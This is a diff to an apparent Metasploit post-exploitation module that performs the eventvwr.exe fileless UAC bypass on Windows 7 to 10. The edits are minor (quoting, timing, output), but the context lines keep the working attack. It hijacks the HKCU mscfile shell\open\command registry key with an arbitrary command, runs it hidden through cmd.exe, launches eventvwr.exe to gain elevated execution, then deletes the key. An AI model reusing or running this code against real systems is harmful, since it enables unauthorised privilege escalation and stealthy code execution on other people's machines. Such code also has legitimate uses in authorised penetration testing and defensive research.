@@ -11,7 +11,7 @@
 # Module Author  : pedr0 Ubuntu [r00t-3xp10it]
 # Vuln discover  : enigma0x3 | @mattifestation
 # Tested on      : Windows 7 | Windows 8 | Windows 10
-# POC: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+# POC: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking
 #
 #
 #
@@ -149,10 +149,10 @@ def ls_stage1
 
   r=''
   session = client
-  vul_serve = 'eventvwr.exe'                                   # vulnerable soft to be hijacked
+  vul_serve = "eventvwr.exe"                                   # vulnerable soft to be hijacked
   exec_comm = datastore['CMD_COMMAND']                         # my cmd command to execute
-  comm_path = '%SystemRoot%\\System32\\cmd.exe /c'             # %comspec% path 
-  regi_hive = 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command' # registry hive key to be hijacked
+  comm_path = "%SystemRoot%\\System32\\cmd.exe /c"             # %comspec% path 
+  regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
   comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f" # injection registry oneliner command
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
@@ -186,7 +186,7 @@ def ls_stage1
  print_good(" Hijacking proccess to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
- Rex::sleep(3.0)
+ Rex::sleep(4.0)
 
       # start remote service to gain code execution
       print_good(" Starting eventvwr.exe native proccess...")
@@ -214,7 +214,7 @@ def ls_stage2
 
   r=''
   session = client
-  reg_clean = 'REG DELETE HKCU\\Software\\Classes\\mscfile /f' # registry hive to be clean
+  reg_clean = "REG DELETE HKCU\\Software\\Classes\\mscfile /f" # registry hive to be clean
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['DEL_REGKEY'] == 'nil'
@@ -306,7 +306,8 @@ def ls_stage3
       key_status = "#{check_vuln_key}"
     end
 
-  # display target registry settings to user... 
+  print_line("")
+  # display target registry settings to user...
   print_line("VULNERABLE_SOFT : #{vuln_soft}")
   print_line("    VULN_HIVE   : #{vuln_hive}")
   print_line("    KEY_DATA    : #{hive_status}")
